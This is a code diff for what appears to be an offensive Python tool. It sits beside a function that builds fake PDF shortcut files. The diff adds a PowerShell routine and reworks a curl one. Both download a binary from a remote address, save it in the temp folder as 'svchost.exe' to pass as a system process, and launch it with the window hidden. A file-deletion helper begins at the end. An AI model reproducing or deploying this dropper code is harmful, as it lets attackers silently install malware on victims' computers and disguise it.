@@ -86,15 +86,45 @@ def fakePdf(googleDocLink, pathToBinary):
     
     return (pdfLNK, pdfLNKArguments)
 
-def downloadAndLaunchTheBinary(remoteAddress, outputName="svchost.exe", outputLocation="%TMP%"):
+def downloadAndLaunchTheBinaryCMD(remoteAddress, outputName="svchost.exe", outputLocation="%TMP%"):
     """
     %COMSPEC%: C:\Windows\System32\cmd.exe
+    Downloads a binary from the provided remote address and launches it after downloading.
     """
+    # Path to save the binary in the provided location
     outputBinaryPath = os.path.join(outputLocation, outputName)
+
+    # Command to download the file using curl
     downloadCmd = "%COMSPEC% "
-    downloadCmdArguments = f"/c \"start /B C:\Windows\System32\curl.exe {remoteAddress} --output {outputBinaryPath} & {outputBinaryPath}\""
-    
+    downloadCmdArguments = f"/c curl -o {outputBinaryPath} {remoteAddress} && start /B {outputBinaryPath}"
+
     return (downloadCmd, downloadCmdArguments)
+
+def downloadAndLaunchTheBinary(remoteAddress, outputName="svchost.exe", outputLocation="%TMP%"):
+    """
+    Downloads a binary from the provided remote address using PowerShell's Invoke-WebRequest
+    and launches it without displaying any output or command window.
+    """
+    # Path to save the binary in the provided location
+    outputBinaryPath = os.path.join(outputLocation, outputName)
+
+    # Get the actual value of %SystemRoot%
+    system_root = os.environ.get('SystemRoot', r'C:\Windows')
+
+    # Full path to powershell.exe
+    powershell_path = os.path.join(system_root, "System32", "WindowsPowerShell", "v1.0", "powershell.exe")
+
+    # PowerShell command to download the file and run it silently
+    downloadCmd = powershell_path
+    downloadCmdArguments = (
+        f"-WindowStyle Hidden -Command \""
+        f"Invoke-WebRequest -Uri '{remoteAddress}' -OutFile '{outputBinaryPath}'; "
+        f"Start-Process -NoNewWindow -FilePath '{outputBinaryPath}'"
+        f"\""
+    )
+
+    return (downloadCmd, downloadCmdArguments)
+
 
 def deleteAllFiles():
     deleteCmd = "%COMSPEC% "
